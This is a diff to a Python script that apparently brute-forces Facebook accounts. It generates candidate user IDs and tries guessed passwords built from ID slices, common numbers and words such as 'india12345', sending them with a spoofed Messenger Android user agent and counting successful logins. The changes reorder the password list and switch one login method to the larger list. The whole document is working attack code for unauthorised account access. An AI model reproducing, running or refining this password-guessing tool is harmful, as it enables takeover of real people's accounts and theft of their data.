@@ -281,7 +281,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = [ids,ids[6:],ids[8:],ids[:6],ids[:8],'57273200','57575751','59039200']
+                        pasx = ['57273200',ids,ids[6:],ids[8:],ids[:6],ids[:8],'57575751','59039200']
                         pasa= [ids,ids[:8],ids[:6],ids[:7]]
                         pasb= ['57273200','57575751','59039200','57575752']
                         pasc= ['hindustan','india12345','india123']
@@ -432,14 +432,14 @@ def _M2_(ids,pasx):
         except Exception as e:
                pass
 #━━━━━━━━━━━━━[MATHOD━X━M3]━━━━━━━━━━━━━━━━#
-def _M3_(ids,pasb):
+def _M3_(ids,pasx):
         global loop
         global ok
         global agents
         sys.stdout.write(f'\r\r\033[38;5;48m{G}[BITHIKA-M3] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
         sys.stdout.flush()
         try:
-                for ps in pasb:
+                for ps in pasx:
                         session = requests.Session()
                         user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                         data={
